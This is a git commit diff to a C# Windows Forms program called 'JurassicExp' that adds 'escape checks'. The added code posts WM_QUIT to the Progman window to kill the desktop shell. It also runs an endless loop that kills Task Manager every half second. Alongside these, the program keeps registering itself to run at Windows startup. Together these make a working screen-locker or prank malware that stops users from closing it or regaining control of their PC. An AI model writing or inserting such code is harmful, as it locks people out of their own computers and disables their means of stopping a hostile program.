27e03d5f6cb7964991cc857b83dd85f4cc6bd904
Eric Qian <eric@enumc.com>
2017-10-25 00:17:20 -0700

    Remove Redundant Background Image + More Escape Checks

--- JurassicExp/JurassicExp/Form1.cs
+++ JurassicExp/JurassicExp/Form1.cs
@@ -1,17 +1,43 @@
 ﻿using Microsoft.Win32;
 using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 namespace JurassicExp
 {
     public partial class Form1 : Form
     {
+        [DllImport("user32.dll")]
+        public static extern int FindWindow(string lpClassName, string lpWindowName);
+        [DllImport("user32.dll")]
+        public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
+
+        [return: MarshalAs(UnmanagedType.Bool)]
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool PostMessage(int hWnd, uint Msg, int wParam, int lParam);
+
+        Form2 frm;
         public Form1()
         {
             InitializeComponent();
+
             RegisterInStartup(true);
         }
-
+        public void EndTask()
+        {
+            foreach (Process p in System.Diagnostics.Process.GetProcessesByName("taskmgr"))
+            {
+                try
+                {
+                    p.Kill();
+                    p.WaitForExit(); // possibly with a timeout
+                }
+                catch(Exception e) {  }
+            }
+            
+        }
         private void button1_Click(object sender, EventArgs e)
         {
             //string url1 = "";
@@ -23,14 +49,30 @@ namespace JurassicExp
 
         private void button2_Click(object sender, System.EventArgs e)
         {
-            Form2 frm = new Form2();
+            frm = new Form2();
             frm.Show();
             
         }
+        
+        
+
         private void Form1_Load(object sender, EventArgs e)
         {
+            int hwnd;
+            hwnd = FindWindow("Progman", null);
+            PostMessage(hwnd, /*WM_QUIT*/ 0x12, 0, 0);
+
+            System.Threading.Tasks.Task.Run(() =>
+            {
+                while (true)
+                {
+                    EndTask();
+                    System.Threading.Thread.Sleep(500);
+                }
+            });
             
         }
+
         // This method adds the current executable to the startup directory of Windows OS.
         private void RegisterInStartup(bool isChecked)
         {
